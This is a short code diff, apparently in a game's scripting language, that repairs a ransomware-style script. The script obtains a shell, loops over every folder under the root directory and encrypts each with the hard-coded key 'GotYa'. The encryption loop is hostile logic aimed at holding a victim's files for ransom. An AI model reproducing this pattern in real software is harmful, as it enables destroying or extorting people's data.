@@ -4,11 +4,12 @@ cryptools = include_lib("/lib/crypto.so")
 
 pc = get_shell
 
-computer = shell.host_computer()
+computer = pc.host_computer()
 folders = computer.File("/")
 
 if folders then
-	for folder in folders
-		ransome = folder.encrypt("/"+"folder.name", "GotYa")
+	all_folders = folders.get_folders()
+	for folder in all_folders
+		ransome = cryptools.encrypt("/"+folder.name, "GotYa")
 	end for
 end if
